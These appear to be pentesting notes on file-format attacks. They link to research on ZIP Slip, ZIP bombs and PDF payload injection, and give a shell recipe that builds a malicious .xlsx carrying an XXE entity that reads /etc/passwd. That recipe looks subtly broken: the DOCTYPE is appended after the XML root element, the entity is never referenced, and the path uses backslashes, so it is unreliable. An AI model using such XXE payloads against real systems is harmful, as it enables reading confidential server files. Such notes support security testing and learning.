## ZIP Archives

> Vulnerabilities in this category also applies to `.apk`, `.jar`, `.pptx`, `.docx` and `.xlsx` files

ZIP Slip (path traversal rewrite), ZIP Symlinks, ZIP bombs, and mitigations: https://trebledj.me/posts/attack-of-the-zip/

ZIP structure: https://blog.ostorlab.co/zip-packages-exploitation.html
## PDF

Attacking a file generator: [[XSS#Server-side]]

[Injecting payload directly into the PDF](https://portswigger.net/research/portable-data-exfiltration)

## Microsoft file formats

In addition to ZIP-vulnerabilities, these files can be exploited with XXE. 

For a given `file.xlsx`:

```
unzip file.xlsx -d payload
cd payload
echo '<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" >]>' >> xl\worksheets\sheet1.xml
zip -0 -r payload.xlsx .
# debug
# file payload.xlsx
# zipinfo -1 payload.xlsx
```

XLSX files typically use DEFLATE and LZMA compression algorithms. MIME type checkers also look for the directory structure inside a file to distinguish ZIP from XLSX:
```
|-- [Content_Types].xml
|-- _rels
|    |--.rels
|-- docProps
|    |-- core.xml
|    |-- app.xml
|-- xl
|    |-- _rels
|    |    |-- workbook.xml.rels
|    |-- workbook.xml
|    |-- worksheets
|    |    |-- sheet1.xml
```
